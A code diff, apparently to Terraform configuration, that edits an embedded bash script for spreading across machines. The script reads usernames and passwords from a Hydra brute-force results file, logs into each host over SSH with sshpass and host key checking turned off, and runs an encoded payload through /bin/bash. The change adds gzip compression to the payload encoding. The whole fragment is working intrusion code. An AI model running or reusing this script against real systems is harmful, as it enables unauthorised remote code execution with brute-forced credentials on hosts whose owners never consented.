@@ -5,7 +5,7 @@ locals {
         :
         [ target ]
     ])
-    base64_command_payload = base64encode(var.inputs["payload"])
+    base64_command_payload = var.inputs["payload"]
     payload = <<-EOT
     # Function to convert IP address to decimal
     ip_to_dec() {
@@ -105,8 +105,8 @@ locals {
             host=$(echo "$line" | awk '{print $3}')
             username=$(echo "$line" | awk '{print $5}')
             password=$(echo "$line" | awk '{print $7}')
-            log "Attempting to execute payload: sshpass -p \"$password\" ssh -o StrictHostKeyChecking=no \"$username\"@\"$host\" 'echo ${local.base64_command_payload} | base64 -d | /bin/bash"
-            sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$host" 'echo ${local.base64_command_payload} | base64 -d | /bin/bash'
+            log "Attempting to execute payload: sshpass -p \"$password\" ssh -o StrictHostKeyChecking=no \"$username\"@\"$host\" 'echo ${base64gzip(local.base64_command_payload)} | base64 -d | gunzip | /bin/bash"
+            sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$host" 'echo ${base64gzip(local.base64_command_payload)} | base64 -d | gunzip | /bin/bash'
             log "Done"
         done < <(grep -v "^#" /tmp/hydra-found.txt | sort | uniq)
         log "Done."
